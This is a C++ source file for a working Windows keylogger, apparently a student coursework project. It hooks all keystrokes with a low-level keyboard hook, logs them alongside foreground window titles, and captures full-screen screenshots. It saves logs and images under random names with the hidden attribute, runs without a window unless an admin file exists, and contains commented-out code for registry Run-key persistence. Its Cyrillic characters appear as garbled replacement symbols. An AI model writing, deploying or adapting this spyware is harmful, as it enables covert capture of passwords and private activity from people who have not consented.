#include "KeyLogger.hpp"
#include "MakeFileDLL.h"


// �������� ������� ������ � �������, ���� �� ����, �� ����� ��� ����
int KeyLogger::getEncoderClsid(const WCHAR* format, CLSID* pClsid) 
{
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;  // Failure

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}


bool KeyLogger::isCaps() {
    if ((GetKeyState(VK_CAPITAL) & 0x0001) ^ (GetKeyState(VK_SHIFT) & 0x8000)) {
        return true;
    }
    else {
        return false;
    }
}

char KeyLogger::translateChar(int& key) {
    if (currentLayout == RUS) {
        switch (static_cast<char> (key)) {
        case 'Q':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'W':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'E':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'R':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'T':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'Y':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'U':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'I':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'O':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'P':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'A':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'S':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'D':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'F':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'G':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'H':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'J':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'K':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'L':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'Z':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'X':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'C':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'V':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'B':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'N':
            if (isCaps()) return '�';
            else return '�';
            break;
        case 'M':
            if (isCaps()) return '�';
            else return '�';
            break;
        case ',':
            if (isCaps()) return '�';
            else return '�';
            break;
        case '.':
            if (isCaps()) return '�';
            else return '�';
            break;
        case '/':
            if (isCaps()) return ',';
            else return '.';
            break;
        case ';':
            if (isCaps()) return '�';
            else return '�';
            break;
        case '\'':
            if (isCaps()) return '�';
            else return '�';
            break;
        case '[':
            if (isCaps()) return '�';
            else return '�';
            break;
        case ']':
            if (isCaps()) return '�';
            else return '�';
            break;
        }
    }

    return static_cast<char> (key);
}


std::string KeyLogger::interpreteKey(int& key) {
    std::string result;

    if (key == VK_BACK) result = "[BACKSPACE]";
    else if (key == VK_LMENU) result = "[ALT]";
    else if (key == VK_RETURN) result = "[ENTER]";
    else if (key == VK_SPACE) result = " ";
    else if (key == VK_TAB) result = /*"[TAB]"*/"";
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) result = /*"[SHIFT]"*/ "";
    else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) result = "[CONTROL]";
    else if (key == VK_ESCAPE) result = "[ESC]";
    else if (key == VK_END) result = "[END]";
    else if (key == VK_HOME) result = "[HOME]";
    else if (key == VK_LEFT) result = "[LEFT]";
    else if (key == VK_RIGHT) result = "[RIGHT]";
    else if (key == VK_UP) result = "[UP]";
    else if (key == VK_DOWN) result = "[DOWN]";
    else if (key == 190 || key == 110) result = ".";
    else if (key == 189 || key == 109) result = "-";
    else if (key == VK_CAPITAL) result = /*"[CAPS]"*/ "";
    else {
        if (isCaps() == TRUE) {
            switch (static_cast<char> (key))
            {
            case '1':
                result = '!';
                break;
            case '2':
                if (currentLayout == ENG)
                    result = "@";
                else if (currentLayout == RUS)
                    result = "\"";
                break;
            case '3':
                if (currentLayout == ENG)
                    result = "#";
                else if (currentLayout == RUS)
                    result = "�";
                break;
            case '4':
                if (currentLayout == ENG)
                    result = "$";
                else if (currentLayout == RUS)
                    result = ";";
                break;
            case '5':
                result = "%";
                break;
            case '6':
                if (currentLayout == ENG)
                    result = "^";
                else if (currentLayout == RUS)
                    result = ":";
                break;
            case '7':
                if (currentLayout == ENG)
                    result = "&";
                else if (currentLayout == RUS)
                    result = "?";
                break;
            case '8':
                result = "*";
                break;
            case '9':
                result = "(";
                break;
            case '0':
                result = ")";
                break;
            case '-':
                result = "_";
                break;
            case '=':
                result = "+";
                break;
            case '[':
                if (currentLayout == ENG)
                    result = "{";
                else if (currentLayout == RUS)
                    result = "�";
                break;
            case ']':
                if (currentLayout == ENG)
                    result = "}";
                else if (currentLayout == RUS)
                    result = "�";
                break;
            case ';':
                if (currentLayout == ENG)
                    result = ":";
                else if (currentLayout == RUS)
                    result = "�";
                break;
            case '\'':
                if (currentLayout == ENG)
                    result = "\"";
                else if (currentLayout == RUS)
                    result = "�";
                break;
            case VK_OEM_COMMA:
                if (currentLayout == ENG)
                    result = "<";
                else if (currentLayout == RUS)
                    result = "�";
                break;
            case '.':
                if (currentLayout == ENG)
                    result = ">";
                else if (currentLayout == RUS)
                    result = "�";
                break;
            case '/':
                if (currentLayout == ENG)
                    result = "?";
                else if (currentLayout == RUS)
                    result = ",";
                break;
            case '\\':
                if (currentLayout == ENG)
                    result = "|";
                else if (currentLayout == RUS)
                    result = "/";
                break;
            case '`':
                if (currentLayout == ENG)
                    result = "~";
                else if (currentLayout == RUS)
                    result = "�";
                break;
            default:
                result += translateChar(key);
                break;
            }
        }
        else {
            result += static_cast<char>(tolower(static_cast<int>(translateChar(key))));
        }
    }
    return result;
}


void KeyLogger::saveInput(int key) {

    wchar_t* wndOutput = nullptr;
    DWORD threadID;
    HWND hForeground = GetForegroundWindow();
    if (hForeground) {
        threadID = GetWindowThreadProcessId(hForeground, NULL);
        currentLayout = LOWORD(GetKeyboardLayout(threadID));
        GetWindowTextA(hForeground, curWind, 256);
        if (strcmp(curWind, prevWind) != 0) {
            isWindowChanged = true;
            strcpy_s(prevWind, curWind);
        }
    }
    GetLocalTime(&currentTime);

    if (reload) {
        startTime = currentTime;
        reload = false;
    }

    if (start) {
        input += interpreteKey(key);
        start = false;
        return;
    }

    if ((currentTime.wSecond + currentTime.wMinute * 60) - (previousTime.wSecond + previousTime.wMinute * 60) < 3 and !isWindowChanged and (interpreteKey(key) != "[ENTER]")) {
        input += interpreteKey(key);
    }
    else {

        if (input != "") {

            if (curImage > MAXAMOUNTOFIMAGES - 1) curImage = 0;

            file.open(keyboardInput, std::ofstream::app);
            SetFileAttributes(keyboardInput, FILE_ATTRIBUTE_HIDDEN);

            std::string time;
            if (startTime.wMinute > 9) {
                time = std::to_string(startTime.wHour) + ":" + std::to_string(startTime.wMinute);
            }
            else {
                time = std::to_string(startTime.wHour) + ":" + '0' + std::to_string(startTime.wMinute);
            }
            if (startTime.wSecond > 9) {
                time += ":" + std::to_string(startTime.wSecond);
            }
            else {
                time += ":0" + std::to_string(startTime.wSecond);
            }
            input = input + " | " + time;
            file << input << std::endl;
            if (isWindowChanged) file << curWind << std::endl;

            file.close();

            HDC wndDC = GetWindowDC(wndHwnd);

            if (showWindow) {
                wndOutput = new wchar_t[input.size()];
                MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, input.c_str(), static_cast<int>(input.size()), wndOutput, static_cast<int>(input.size()));
                SetTextColor(wndDC, 0x00000000);
                DrawText(wndDC, wndOutput, static_cast<int>(input.size()), &rect, DT_TOP);
                rect.top += 40;
                if (rect.top > heightOfScreen - 40) rect.top = 40;
                delete[] wndOutput;
                wndOutput = nullptr;
            }

            input = "";
            input += interpreteKey(key);
            reload = true;

            HDC hScreen = GetDC(NULL); //������ �������� ����� ������
            HDC hDC = CreateCompatibleDC(hScreen); //������ �������� ����������� � ���������� ������ 
            HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, widthOfScreen, heightOfScreen); //������ ����� �������� (�����������) ��� ������.
            SelectObject(hDC, hBitmap);
            BitBlt(hDC, 0, 0, widthOfScreen, heightOfScreen, hScreen, rectScreenShot.left, rectScreenShot.bottom, SRCCOPY); //������� ����� ������ � �����������
            if (hBitmap) // ���������� ���������� �������� � ����
            {
                Gdiplus::Bitmap bmp(hBitmap, nullptr);
                CLSID pngClsid;
                getEncoderClsid(L"image/png", &pngClsid); //�������� �� ������� ������, ���� ��� ����, �� ������ �� �����
                bmp.Save(names[curImage], &pngClsid, NULL);
                SetFileAttributes(names[curImage], FILE_ATTRIBUTE_HIDDEN);

                if (showWindow) {
                    StretchBlt(wndDC, 0, 0, static_cast<int>(widthOfScreen * 0.8), static_cast<int>(heightOfScreen * 0.8), hDC, 0, 0, rectScreenShot.right, rectScreenShot.top, SRCCOPY);
                }

                curImage++;
            }

            DeleteDC(wndDC);
            DeleteDC(hDC);
            DeleteDC(hScreen);
            if (hBitmap != 0) {
                DeleteObject(hBitmap);
            }

            if (isWindowChanged) isWindowChanged = false;

            if (wndOutput != nullptr) delete[] wndOutput;
        }
    }

    previousTime = currentTime;
}


void KeyLogger::checkAdminMode(HINSTANCE& hInstance) {
    std::ifstream windowMode;
    windowMode.open("C:\\CW\\admin.txt");
    if (windowMode.is_open()) {
        showWindow = true;
        wchar_t className[] = L"Nokeylogger";
        WNDCLASS mainWindow = {};
        mainWindow.hInstance = hInstance;
        mainWindow.hbrBackground = (HBRUSH)COLOR_WINDOW;
        mainWindow.hIcon = LoadIcon(NULL, IDI_APPLICATION);
        mainWindow.lpszClassName = className;
        mainWindow.hCursor = LoadCursor(NULL, IDC_ARROW);
        mainWindow.lpfnWndProc = windowBehaviour;
        RegisterClass(&mainWindow);
        wndHwnd = CreateWindow(className, L"Nokeylogger", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
            CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, NULL, NULL);
    }
    else {
        showWindow = false;
    }
    windowMode.close();
}


void KeyLogger::startLogging() {
 /*   HKEY hKey;
    char szPath[0x100];
    GetModuleFileNameA(NULL, szPath, sizeof(szPath));
    RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (hKey)
    {
        RegSetValueExA(hKey, "CourseWork", NULL, REG_SZ, (LPBYTE)szPath, DWORD(strlen(szPath)));
        RegCloseKey(hKey);
    }
    */

    for (int i = 0; i < MAXAMOUNTOFIMAGES; i++) {
        names[i] = makeRandomFileName(10, L".png", 5);
    }
    keyboardInput = makeRandomFileName(5, L".txt", 5);

    rectScreenShot.left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    rectScreenShot.bottom = GetSystemMetrics(SM_YVIRTUALSCREEN);
    rectScreenShot.right = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    rectScreenShot.top = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    widthOfScreen = rectScreenShot.right - rectScreenShot.left;
    heightOfScreen = rectScreenShot.top - rectScreenShot.bottom;
    rect.left = static_cast<LONG>(widthOfScreen * 0.81);
    rect.right = widthOfScreen;
    rect.top = heightOfScreen;

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, logKey, NULL, NULL);
    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, NULL, NULL)) {
        DispatchMessage(&msg);
        TranslateMessage(&msg);
    }   
} 


LRESULT CALLBACK logKey(int nCode, WPARAM wParam, LPARAM lParam) {
    if (wParam == WM_KEYDOWN) {
        keyLogger.kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
        keyLogger.saveInput(keyLogger.kbStruct.vkCode);
    }

    return CallNextHookEx(keyLogger.hHook, nCode, wParam, lParam);
}

LRESULT CALLBACK windowBehaviour(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE:
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

    return EXIT_FAILURE;
};